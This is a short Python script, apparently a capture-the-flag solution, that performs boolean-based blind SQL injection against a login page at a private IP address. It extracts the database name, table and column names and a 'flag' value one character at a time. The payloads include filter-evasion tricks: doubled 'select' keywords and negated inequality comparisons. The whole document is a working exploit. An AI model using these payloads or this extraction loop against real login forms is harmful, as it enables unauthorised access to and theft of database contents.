import requests
import urllib


url = 'http://10.21.13.190:21007/login.php'
payloads=list("1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@!#$%^&*()-=+~`[];{},'./")

#database:
sql_database="' or !(ascii(mid(database() from %s for 1))<>%s)#"
#判断table:
sql_table="' or !(ascii(mid((selselectect group_concat(table_name) from information_schema.tables where !(table_schema<>'heiheihei')) from %s for 1))<>%s)# "

#判断列column:
sql_column=" ' or !(ascii(mid((selselectect group_concat(column_name) from information_schema.columns where !(table_name<>'f1ag')) from %s for 1))<>%s)# "

#列出flag:
sql="' or !(ascii(mid((selecselectt group_concat(flag) from f1ag) from %s for 1))<>%s)#"


printlen=''
for y in range(100):
    for x in payloads:
        data = {
            "username":sql %(y,ord(x)),
            "password":"123",
            "submit":"++%E7%A1%AE+%E5%AE%9A++",
        }
        response = requests.post(url,data=data)
        text = response.text
        if '嘿嘿嘿' in text:
            printlen=printlen+x
            print(printlen)
